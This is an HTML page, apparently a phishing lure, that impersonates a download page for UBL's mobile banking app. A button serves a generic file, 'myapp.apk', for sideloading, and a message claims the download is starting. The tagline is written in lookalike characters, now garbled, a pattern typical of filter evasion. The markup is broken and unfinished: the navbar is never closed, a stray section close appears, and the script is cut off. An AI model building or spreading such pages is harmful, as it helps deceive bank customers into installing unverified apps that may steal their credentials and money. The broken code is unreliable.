<!DOCTYPE html>
<html lang="en">
<head>

  <title>UBL App Download</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: #ffffff;
      color: #111827;
    }

    a {
      text-decoration: none;
    }

    /* ======= NAVBAR ======= */
    .navbar {
      background: white;
      padding: 16px 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 1px 5px rgba(0,0,0,0.05);
      position: relative;
    }

    .navbar .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .navbar .logo img {
      height: 40px;
    }

    .navbar .logo span {
      font-weight: 700;
      font-size: 20px;
      color: #0083CA;
    }

    .menu-toggle {
      display: none;
      flex-direction: column;
      justify-content: center;
      width: 30px;
      height: 30px;
      border: 2px solid #0083CA;
      border-radius: 6px;
      cursor: pointer;
    }

    .menu-toggle div {
      height: 3px;
      background: #0083CA;
      margin: 4px 0;
    }

    .nav-links {
      display: flex;
      gap: 20px;
    }

    .nav-links a {
      color: #374151;
      font-weight: 500;
      padding: 8px;
    }

    .nav-links a.button {
      background: #0083CA;
      color: white;
      border-radius: 6px;
      padding: 8px 16px;
    }

    /* ======= HERO SECTION ======= */
    .hero {
      padding: 60px 20px;
      text-align: center;
    }

    .hero h1 {
      font-size: 28px;
      font-weight: 700;
      margin-bottom: 12px;
      color: #0083CA;
    }

    .hero p {
      font-size: 16px;
      color: #0083CA;
      max-width: 600px;
      margin: 0 auto 30px;
    }

    .download-btn {
      background: #0083CA;
      color: white;
      padding: 14px 28px;
      font-size: 16px;
      border-radius: 8px;
      display: inline-block;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
      transition: background 0.3s;
    }

    .download-btn:hover {
      background: #065f46;
    }

    #download-msg {
      margin-top: 16px;
      color: #ffffff;
      font-weight: 500;
      display: none;
    }

    .preview {
      margin-top: 40px;
    }

    .preview img {
      max-width: 90%;
      border-radius: 12px;
      box-shadow: 0 6px 16px rgba(0,0,0,0.08);
    }

    /* ======= MOBILE MENU ======= */
    @media (max-width: 768px) {
      .menu-toggle {
        display: flex;
      }

      .nav-links {
        position: absolute;
        top: 100%;
        left: 0;
        width: 100%;
        background: white;
        flex-direction: column;
        align-items: flex-start;
        padding: 16px 24px;
        gap: 10px;
        display: none;
        box-shadow: 0 4px 10px rgba(0,0,0,0.05);
      }

      .nav-links.show {
        display: flex;
      }

      .nav-links a {
        width: 100%;
      }
    }
  </style>
</head>
<body>

  <!-- NAVBAR -->
  <nav class="navbar">

    <div class="menu-toggle" onclick="toggleMenu()">

    <p>–ïnj–æy h–∞ssl–µ-fr–µ–µ b–∞nk—ñng –∞nywh–µr–µ w—ñth UBL M–æb—ñl–µ ‚Äì y–æur –∞ll-—ñn-–æn–µ f—ñn–∞nc—ñ–∞l –∞pp –æn th–µ g–æ.</p>

    <!-- Download Button with message -->
    <a href="myapp.apk" class="download-btn" download onclick="showDownloadMessage()">üì• Download App</a>
    <p id="download-msg">‚úÖ Your download is starting...</p>

    <!-- Image Preview -->
    <div class="preview">
      <img src="preview.jpg" alt="App Screenshot">
    </div>
  </section>

  <!-- Scripts -->
  <script>
    function toggleMenu() {
      const nav = document.getElementById('navLinks');

</body>
</html>
